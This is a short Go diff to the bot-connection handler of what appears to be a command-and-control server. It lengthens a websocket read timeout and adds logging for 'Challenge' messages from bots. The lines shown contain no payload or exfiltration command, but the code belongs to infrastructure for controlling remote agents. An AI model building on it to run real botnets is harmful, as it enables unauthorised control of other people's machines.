@@ -78,13 +78,17 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 
 	msg := models.BotMessage{}
 	for {
-		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
+		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
 		err := wsjson.Read(ctx, con, &msg)
 		cancel()
 
 		if err != nil {
 			log.Println("Bot Disconnected/Timeout : ", err)
 			return
+		}
+
+		if msg.Type == "Challenge" {
+			log.Println("Challenge response recieved from the bot : ", pb.Agentid)
 		}
 
 	}
